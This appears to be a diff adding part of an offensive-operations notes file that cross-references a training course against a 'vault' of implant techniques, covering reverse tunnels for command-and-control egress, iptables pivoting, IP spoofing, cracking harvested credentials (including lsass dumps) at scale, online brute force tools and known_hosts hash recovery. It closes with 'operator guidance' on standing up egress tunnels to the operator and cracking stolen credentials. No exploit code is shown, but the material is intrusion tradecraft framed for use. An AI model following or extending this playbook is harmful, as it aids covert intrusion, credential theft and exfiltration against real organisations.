+- **`known_hosts` IP hash deobfuscation** — recovers IPs of hosts an operator has SSH'd to. Useful for forensic counter-attribution.
+- **OONI Probe + ping.pe for censorship/reachability validation** — pre-engagement site survey. Pairs with T-019 dead-drop endpoint validation.
+- **Tor verification** (`check.torproject.org/api/ip`) — confirms SOCKS5 Tor routing. Useful for T-022's kamui when configured for Tor exit.
+
+**Specific knowledge added not in vault:**
+
+- The explicit assertion that **GMail brute force is impossible** — clears a common operator misconception.
+- The **Cymru WHOIS bulk ASN lookup** via `netcat whois.cymru.com 43` — fast bulk attribution without API keys.
+- The **iptables `MARK` + `CONNMARK` + `MASQUERADE` idiom** for transparent kernel pivoting — operator-grade tradecraft absent from the vault's Linux coverage.
+- The **`kh-converter.py` + `ipv4_hcmask.txt`** recipe for `known_hosts` hash recovery — direct OPSEC counter-attribution tradecraft.
+
+## Cross-Reference Matrix
+
+| Training Concept | Vault Technique | Relationship |
+|---|---|---|
+| Host discovery (ARP/ICMP) | T-023 `byakugan.rs` | byakugan is implant-side; training covers operator-side via nmap/ping through pivots |
+| tcpdump connection monitoring | (none) | No vault analog; training-only operator tradecraft |
+| socat/openssl TLS bridging | T-022 `henge.rs` malleable C2 | henge is application-layer protocol fronting; socat/openssl is transport-layer ad-hoc |
+| Public reverse TCP ports (segfault/bore/serveo) | T-019 Edo Dead Drop | Dead drop is autonomous + decentralized; these services are interactive + centralized but useful as bootstrap |
+| HTTPS reverse tunnels (cloudflared/localhost.run/remote.moe) | T-022 `http_poll_transport.rs` | http_poll is message-oriented pull; cloudflared tunnel is stream-oriented bidirectional. Complementary — vault transport can run *inside* a cloudflared tunnel for OPSEC layering |
+| websocat/gost mwss raw-TCP-over-HTTPS | T-022 transports | Vault transports are protocol-native; training shows how to wrap them through HTTPS-only egress via WebSocket bridge |
+| iptables MARK/DNAT/MASQUERADE bouncing | T-022 `juubi.rs` peer relay | juubi is userspace Rust relay; iptables bounce is kernel-level — more stealthy on Linux pivots |
+| Ghost IP source spoofing | (none) | No vault analog; L3 camouflage absent from vault |
+| CDN-camouflaged reverse SOCKS (cloudflared + ssh -R) | T-019 Edo Dead Drop (Google Translate front) | Edo uses Google Translate for dead-drop fronting; this is interactive pivot variant using CF Zero Trust |
+| SOCKS pivot via gs-netcat + ProxyChains/graftcp | T-022 `kamui.rs` SOCKS5 | kamui is implant-side server; ProxyChains/graftcp are operator-side clients that consume kamui's listener |
+| SSH as cheap reverse proxy via Cloudflare | T-022 `juubi_chain.rs` | juubi_chain is multi-hop peer relay; ssh -R via CF is single-hop but CDN-camouflaged |
+| Public IP / geo / ASN enumeration | T-023 `byakugan.rs` | byakugan does internal AD/ARP recon; these commands are external attribution tradecraft |
+| Global reachability (ping.pe, OONI) | T-019 Edo Dead Drop | Critical for verifying dead-drop endpoints (Google Translate, blockchain RPCs) are reachable through target DPI |
+| Port scanning (nmap, Shodan internetdb, /dev/tcp) | T-023 `byakugan.rs` | byakugan covers internal TCP recon; these extend to external perimeter + passive intel |
+| Hash cracking (hashcat + vast.ai + hcmasks) | T-023 `harvest/lsass_dump.rs`, `harvest/extract_wifi.rs` | Vault harvests hashes; training operationalizes cracking — fills post-exfil gap |
+| known_hosts hash deobfuscation | (none) | No vault analog; OPSEC counter-attribution tradecraft |
+| Online brute force (nmap scripts, ncrack, hydra, medusa, msf) | (none) | No vault primitive; fills external service brute force gap |
+| GMail brute force impossibility note | (none) | Sanity-check clarification absent from vault |
+
+---
+
+**Operator guidance**: This training is the Linux pivot-and-recon layer that the Windows-focused vault assumes exists but does not document. When deploying vault techniques (T-022 networking, T-019 dead drop, T-023 byakugan recon), use this training to: (1) stand up the egress tunnel back to the operator, (2) drive external recon and brute force through SOCKS pivots, (3) crack harvested credentials at scale via vast.ai, and (4) verify dead-drop endpoint reachability from inside target DPI. The iptables bounce and Ghost IP techniques are candidates for addition to the vault as new Linux-side pivot primitives.
